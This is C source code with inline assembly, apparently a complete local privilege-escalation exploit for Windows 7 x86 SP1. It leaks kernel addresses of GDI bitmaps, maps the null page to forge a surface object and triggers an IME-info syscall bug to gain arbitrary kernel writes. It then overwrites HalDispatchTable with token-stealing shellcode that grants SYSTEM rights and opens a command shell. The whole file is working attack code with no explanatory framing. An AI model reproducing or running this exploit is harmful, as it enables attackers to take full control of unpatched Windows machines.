#include<stdio.h>
#include<windows.h>


int syscall_index = 0x1226;
#define PEB_GdiSharedHandleTable 0x94  //win7 x86 sp1

typedef struct _GdiCell
{
	PVOID pKernelAddress;
	UINT16 wProcessIdl;
	UINT16 wCount;
	UINT16 wUpper;
	UINT16 uType;
	PVOID pUserAddress;
}GdiCell,*pGdiCell;

typedef NTSTATUS  (__stdcall *_ZwAllocateVirtualMemory)(
	_In_    HANDLE    ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_In_    ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T   RegionSize,
	_In_    ULONG     AllocationType,
	_In_    ULONG     Protect
);

typedef NTSTATUS (__stdcall*_ZwQuerySystemInformation)(
	_In_      DWORD SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
);


typedef NTSTATUS(WINAPI* _NtQueryIntervalProfile)(IN ULONG   ProfileSource,
	OUT PULONG Interval);


typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;



void __declspec(naked) NtSetUserImeEx(int a)
{
	__asm
	{
		mov esi,a
		mov eax,syscall_index
		mov edx,0x7ffe0300
		call dword ptr[edx]
		ret 4
	}
}

void __declspec(naked) GetSystemToken()
{
	__asm
	{
		pushad
		mov eax,fs:[0x124]  //CurrentThread
		mov eax,[eax+0x150] //Process  
		lea edx,[eax+0xf8]  //MyProcess.Token
noFind:
		mov eax,[eax+0xb8]  //Eprocess.ActiveProcessLinks
		sub eax,0xb8		//next Eprocess struct
		mov ebx,[eax+0xb4]  //PID
		cmp ebx,4
		jnz noFind
		mov eax,[eax+0xf8]	//System.Token
		mov [edx],eax
		lock inc [eax]
		lock inc[eax]
		popad
		ret
	}
}


int main(int argc,char** argv)
{

//泄露内核对象地址
	DWORD Manage_kernel, Worker_kernel, bitMapKernelAddress;
	HBITMAP hManage;
	HBITMAP hWorker;

	hManage = CreateBitmap(5, 5, 5, 5, NULL);
	hWorker = CreateBitmap(5, 5, 5, 5, NULL);
	__asm
	{
		mov eax,fs:[0x30]
		mov eax,[eax+ PEB_GdiSharedHandleTable]
		mov bitMapKernelAddress,eax
	}
	Manage_kernel = *(DWORD*)(((DWORD)hManage & 0xffff) * sizeof(GdiCell) + bitMapKernelAddress); 
	Worker_kernel = *(DWORD*)(((DWORD)hWorker & 0xffff) * sizeof(GdiCell) + bitMapKernelAddress);

	

//获取HalDispatchTable表地址
	DWORD SysModuleSize;
	PVOID NtKernelAddr;
	PVOID NtKernelAddr_InUser;
	PVOID HalDispatchTable;
	char* ImageName;
	char NtKernelImageName[256] = {0};
	PSYSTEM_MODULE_INFORMATION SysModule;
	_ZwQuerySystemInformation ZwQuerySystemInformation;
	
	ZwQuerySystemInformation = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(11, NULL, NULL, &SysModuleSize);
	SysModule = malloc(SysModuleSize);
	ZwQuerySystemInformation(11, SysModule, SysModuleSize, &SysModuleSize);

	NtKernelAddr = SysModule->Module[0].Base;
	strcpy_s(NtKernelImageName, 256, SysModule->Module[0].ImageName);
	ImageName = strrchr(NtKernelImageName, '\\') + 1;
	NtKernelAddr_InUser = LoadLibrary(ImageName);
	HalDispatchTable = GetProcAddress(NtKernelAddr_InUser, "HalDispatchTable");
	HalDispatchTable = (PVOID)((DWORD)HalDispatchTable - (DWORD)NtKernelAddr_InUser + (DWORD)NtKernelAddr);
	(DWORD)HalDispatchTable += 4;

//申请0地址内存并构造SURFOBJ，使Manage.pvScan0 = &Worker.pvScan0
	DWORD* p = NULL;
	PVOID baseAddress = 0x100;
	PVOID RegionSize = 0x1000;
	_ZwAllocateVirtualMemory ZwAllocateVirtualMemory = 0;
	ZwAllocateVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwAllocateVirtualMemory");
	ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, NULL, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	

	DWORD ime[0x57] = {0x90};
	HWINSTA hsta = CreateWindowStation(0, 0, READ_CONTROL, 0);
	SetProcessWindowStation(hsta);

	*(p + 5) = (Worker_kernel + 0x10 + 0x20);  //sizeof(SURFACE.BASEOBJECT) = 0x10
											   //offset(SURFOBJ.pvScan0) = 0x20
	ime[0] = (Worker_kernel + 0x10 + 0x20);    //while ( p[5] != *ime )

	*(p + 0xb) = (Manage_kernel + 0x10 + 0x20);   //v4 = (_DWORD *)p[0xB];
						//if (!v4)
						//	return 0;
	//fix some member what Set/GetBitMapBits use

	DWORD* pp = (DWORD*)& ime[1];                //以下是要修复的一些成员
	pp[0] = 0x180;
	pp[1] = 0xabcd;
	pp[2] = 6;
	pp[3] = 0x10000;
	pp[5] = 0x4800200;



//触发漏洞
	NtSetUserImeEx(&ime);

	DWORD oldHalDispatchTable;
	PVOID ShellCode= GetSystemToken;
	SetBitmapBits(hManage, 4, &HalDispatchTable);
	GetBitmapBits(hWorker, 4, &oldHalDispatchTable);
	SetBitmapBits(hWorker, 4, &ShellCode);

	_NtQueryIntervalProfile NtQueryIntervalProfile;
	ULONG Interval = 0;
	NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");
	NtQueryIntervalProfile(0x1337, &Interval);
	SetBitmapBits(hWorker, 4, &oldHalDispatchTable);

	system("cmd");

	return 0;
}

